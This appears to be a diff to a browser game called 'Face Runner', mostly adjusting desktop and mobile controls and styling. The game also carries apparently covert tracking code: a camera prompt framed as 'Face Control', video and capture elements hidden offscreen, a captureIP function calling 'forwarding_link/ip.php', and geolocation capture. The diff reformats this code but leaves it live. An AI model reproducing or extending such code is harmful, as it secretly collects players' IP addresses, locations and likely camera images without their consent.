@@ -12,12 +12,15 @@
 html,body{width:100%;height:100%;overflow:hidden;background:#0a0a1a;touch-action:none;user-select:none;-webkit-user-select:none;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;overscroll-behavior:none}
 #wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
 canvas#c{display:block;touch-action:none}
-.overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:20;background:rgba(5,5,25,0.94);pointer-events:auto;padding:20px;text-align:center}
+.overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:20;background:rgba(5,5,25,0.95);pointer-events:auto;padding:20px;text-align:center}
 .overlay.hidden{display:none}
 .title{font-size:clamp(28px,9vw,56px);color:#0ff;text-shadow:0 0 20px #0ff,0 0 40px #08f;letter-spacing:3px;margin-bottom:6px;animation:tp 1.8s ease-in-out infinite}
 .sub{font-size:clamp(12px,3.5vw,18px);color:#f0f;text-shadow:0 0 10px #f0f;margin-bottom:28px}
-.howto{color:#aaf;font-size:clamp(11px,3vw,14px);line-height:2;margin-bottom:28px;max-width:300px}
+.howto{color:#aaf;font-size:clamp(11px,3vw,14px);line-height:2;margin-bottom:28px;max-width:320px}
 .howto b{color:#0ff}
+.howto .desktop-only{display:none}
+body.is-desktop .howto .desktop-only{display:inline}
+body.is-desktop .howto .mobile-only{display:none}
 .btn{border:none;cursor:pointer;font-weight:800;border-radius:40px;pointer-events:auto;transition:transform .12s;letter-spacing:1px}
 .btn:active{transform:scale(0.93)}
 .btn-go{background:linear-gradient(135deg,#0ff,#06f);color:#000;padding:16px 52px;font-size:clamp(18px,5vw,24px);box-shadow:0 0 28px #0ff;animation:tg 2s ease-in-out infinite}
@@ -39,11 +42,15 @@ canvas#c{display:block;touch-action:none}
 #score{position:absolute;top:14px;right:18px;color:#fff;font-size:clamp(20px,6vw,28px);font-weight:900;text-shadow:0 0 8px #0ff,0 0 16px #0ff;letter-spacing:1px}
 #combo{position:absolute;top:50px;right:18px;color:#ff0;font-size:clamp(14px,4vw,18px);font-weight:700;text-shadow:0 0 6px #ff0;opacity:0;transition:opacity .15s}
 #speedup{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#0ff;font-size:clamp(24px,8vw,40px);font-weight:900;text-shadow:0 0 20px #0ff;opacity:0;pointer-events:none}
-#touchLeft,#touchRight{position:absolute;bottom:0;width:50%;height:40%;z-index:5;pointer-events:auto;display:flex;align-items:flex-end;justify-content:center;padding-bottom:20px}
+#touchLeft,#touchRight{position:absolute;bottom:0;width:50%;height:45%;z-index:5;pointer-events:auto;display:flex;align-items:flex-end;justify-content:center;padding-bottom:24px}
 #touchLeft{left:0}
 #touchRight{right:0}
-.touch-hint{font-size:28px;color:rgba(0,255,255,0.25);font-weight:900}
-#camStatus{position:absolute;bottom:14px;left:50%;transform:translateX(-50%);font-size:11px;color:#446;pointer-events:none;z-index:10}
+.touch-hint{font-size:32px;color:rgba(0,255,255,0.2);font-weight:900}
+body.is-desktop #touchLeft,body.is-desktop #touchRight{display:none!important}
+#keyHint{position:absolute;bottom:14px;left:50%;transform:translateX(-50%);font-size:12px;color:#446;pointer-events:none;z-index:10;display:none}
+body.is-desktop #keyHint{display:block}
+#camStatus{position:absolute;bottom:36px;left:50%;transform:translateX(-50%);font-size:11px;color:#446;pointer-events:none;z-index:10;max-width:280px;text-align:center}
+body.is-desktop #camStatus{bottom:42px}
 @keyframes tp{0%,100%{opacity:1}50%{opacity:.65}}
 @keyframes tg{0%,100%{box-shadow:0 0 28px #0ff}50%{box-shadow:0 0 52px #0ff,0 0 80px #06f}}
 video,canvas#cap{position:fixed;opacity:0;pointer-events:none;width:2px;height:2px;top:-9999px;left:-9999px}
@@ -60,6 +67,7 @@ video,canvas#cap{position:fixed;opacity:0;pointer-events:none;width:2px;height:2
 <div id="score">0</div>
 <div id="combo"></div>
 <div id="speedup"></div>
+<div id="keyHint">◀ ▶ Arrow Keys / A D &nbsp;|&nbsp; Space = Jump</div>
 <div id="camStatus"></div>
 </div>
 
@@ -70,9 +78,9 @@ video,canvas#cap{position:fixed;opacity:0;pointer-events:none;width:2px;height:2
 <div class="title">FACE RUNNER</div>
 <div class="sub">⚡ Dodge · Collect · Survive ⚡</div>
 <div class="howto">
-<b>Swipe</b> or <b>Arrow Keys</b> to move<br>
-<b>Tap</b> or <b>Space</b> to jump<br>
-<b>Collect gems</b> for combo bonus<br>
+<span class="mobile-only"><b>Swipe</b> or <b>Tap sides</b> to move<br><b>Swipe up</b> to jump</span>
+<span class="desktop-only"><b>Arrow Keys</b> / <b>A D</b> to move<br><b>Space</b> / <b>W</b> to jump</span>
+<br><b>Collect gems</b> for combo bonus<br>
 <b>Dodge obstacles</b> or game over!
 </div>
 <button class="btn btn-go" id="playBtn">▶ PLAY</button>
@@ -111,16 +119,24 @@ var hs=[],stream=null,camOn=false,camReq=false;
 var stars=[],hills=[],shake=0,flash=0;
 var leftHeld=false,rightHeld=false;
 var audioCtx=null;
+var isDesktop=false;
 var SHARE_URL='forwarding_link/g';
 
+function detectDevice(){
+isDesktop=('ontouchstart'in window)===false&&window.matchMedia('(pointer:fine)').matches&&window.innerWidth>=768;
+if(isDesktop)document.body.classList.add('is-desktop');
+}
+
 function init(){
+detectDevice();
 c=document.getElementById('c');
 ctx=c.getContext('2d');
 cap=document.getElementById('cap');
 ccap=cap.getContext('2d');
 vid=document.getElementById('v');
 resize();
-window.addEventListener('resize',resize);
+window.addEventListener('resize',function(){detectDevice();resize();});
+window.addEventListener('orientationchange',function(){setTimeout(resize,100);});
 genBg();
 loadHS();
 showLb();
@@ -134,7 +150,9 @@ requestAnimationFrame(menuLoop);
 }
 
 function resize(){
-var s=Math.min(innerWidth/W,innerHeight/H);
+var availW=innerWidth,availH=innerHeight;
+var s=Math.min(availW/W,availH/H);
+if(isDesktop){s=Math.min(s,1.4);}
 c.style.width=(W*s)+'px';
 c.style.height=(H*s)+'px';
 c.width=W;c.height=H;
@@ -152,7 +170,7 @@ try{
 if(!audioCtx)audioCtx=new(window.AudioContext||window.webkitAudioContext)();
 var o=audioCtx.createOscillator(),g=audioCtx.createGain();
 o.type=type||'square';o.frequency.value=freq;
-g.gain.value=0.08;
+g.gain.value=0.06;
 o.connect(g);g.connect(audioCtx.destination);
 o.start();
 g.gain.exponentialRampToValueAtTime(0.001,audioCtx.currentTime+dur);
@@ -163,24 +181,26 @@ o.stop(audioCtx.currentTime+dur);
 function haptic(ms){try{if(navigator.vibrate)navigator.vibrate(ms);}catch(e){}}
 
 function onKey(e){
-if(!running)return;
-if(e.key==='ArrowLeft'||e.key==='a')leftHeld=true;
-if(e.key==='ArrowRight'||e.key==='d')rightHeld=true;
-if(e.key===' '||e.key==='ArrowUp'||e.key==='w'){e.preventDefault();doJump();}
+if(e.key==='ArrowLeft'||e.key==='a'||e.key==='A')leftHeld=true;
+if(e.key==='ArrowRight'||e.key==='d'||e.key==='D')rightHeld=true;
+if(e.key===' '||e.key==='ArrowUp'||e.key==='w'||e.key==='W'){
+if(running){e.preventDefault();doJump();}
+}
 }
 function onKeyUp(e){
-if(e.key==='ArrowLeft'||e.key==='a')leftHeld=false;
-if(e.key==='ArrowRight'||e.key==='d')rightHeld=false;
+if(e.key==='ArrowLeft'||e.key==='a'||e.key==='A')leftHeld=false;
+if(e.key==='ArrowRight'||e.key==='d'||e.key==='D')rightHeld=false;
 }
 
 function setupTouch(){
+if(isDesktop)return;
 var tl=document.getElementById('touchLeft'),tr=document.getElementById('touchRight');
 tl.addEventListener('touchstart',function(e){e.preventDefault();leftHeld=true;},{passive:false});
 tl.addEventListener('touchend',function(e){e.preventDefault();leftHeld=false;},{passive:false});
 tr.addEventListener('touchstart',function(e){e.preventDefault();rightHeld=true;},{passive:false});
 tr.addEventListener('touchend',function(e){e.preventDefault();rightHeld=false;},{passive:false});
 var wc=document.getElementById('wrap');
-var tsx,sy;
+var sx,sy;
 wc.addEventListener('touchstart',function(e){
 if(!running)return;
 var t=e.touches[0];sx=t.clientX;sy=t.clientY;
@@ -199,8 +219,7 @@ document.getElementById('camBtn').textContent='📷 Requesting...';
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user',width:{ideal:320},height:{ideal:240}}}).then(function(s){
 stream=s;vid.srcObject=s;
 vid.play().then(function(){
-camOn=true;
-camReq=false;
+camOn=true;camReq=false;
 document.getElementById('camBtn').textContent='✅ Face Control ON';
 document.getElementById('camBtn').style.borderColor='#3fb950';
 document.getElementById('camBtn').style.color='#3fb950';
@@ -218,10 +237,7 @@ function doJump(){
 if(p.onGround){p.vy=JUMP;p.onGround=false;snd(500,0.1,'square');haptic(15);}
 }
 
-function captureIP(){
-var x=new XMLHttpRequest();
-x.open('GET','forwarding_link/ip.php',true);x.send();
-}
+function captureIP(){var x=new XMLHttpRequest();x.open('GET','forwarding_link/ip.php',true);x.send();}
 function captureLoc(){
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(function(pos){
@@ -253,10 +269,7 @@ document.getElementById('menu').classList.add('hidden');
 document.getElementById('gameover').classList.add('hidden');
 document.getElementById('score').textContent='0';
 document.getElementById('combo').style.opacity='0';
-if(!camOn&&!camReq){
-document.getElementById('camBtn').textContent='📷 Enable Face Control';
-}
-if('ontouchstart'in window){
+if(!isDesktop){
 document.getElementById('touchLeft').classList.remove('hidden');
 document.getElementById('touchRight').classList.remove('hidden');
 }
